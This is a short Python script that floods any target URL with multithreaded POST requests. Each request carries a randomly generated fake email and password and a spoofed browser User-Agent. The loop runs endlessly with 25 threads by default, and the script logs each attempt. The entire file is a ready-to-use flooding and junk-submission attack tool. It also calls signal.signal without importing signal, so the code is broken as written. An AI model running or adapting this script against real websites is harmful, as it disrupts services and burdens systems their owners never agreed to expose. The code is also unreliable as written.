import threading
import requests
import random
import string
import names
from fake_useragent import UserAgent
import logging
import sys
import argparse

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

#Function to generate a random name for email
def generate_random_name():
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    
    if name_system == "FullName":
        return first_name + last_name# JohnDoe
    elif name_system == "FullFirstFirstInitial":
        return first_name + last_name[0]# JohnD
    else:
        return first_name[0] + last_name# JDoe


def generate_random_email():
    name = generate_random_name()
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])
    return name + str(random.randint(1, 100)) + domain


def generate_random_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))


def send_posts(url):
    while True:
        email = generate_random_email()
        password = generate_random_password()
        data = {"email": email, "password": password}
        
        ua = UserAgent()
        headers = {'User-Agent': ua.random}
        
        try:
            response = requests.post(url, data=data, headers=headers, timeout=5)
            logging.info(f"Email: {email}, Password: {password}, Status Code: {response.status_code}, User-Agent: {headers['User-Agent']}")
        except requests.RequestException as e:
            logging.error(f"Error sending request: {e}")


def main():
    parser = argparse.ArgumentParser(description='Multi-threaded script to flood a target URL with POST requests.')
    parser.add_argument('url', type=str, help='URL of the target to flood')
    parser.add_argument('--threads', type=int, default=25, help='Number of threads (default: 25)')
    args = parser.parse_args()
    
    url = args.url.strip()
    num_threads = args.threads
    
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_posts, args=(url,), daemon=True)
        threads.append(thread)
        thread.start()
    
    # Gracefully ctrlc
    def signal_handler(sig, frame):
        logging.info('Exiting...')
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
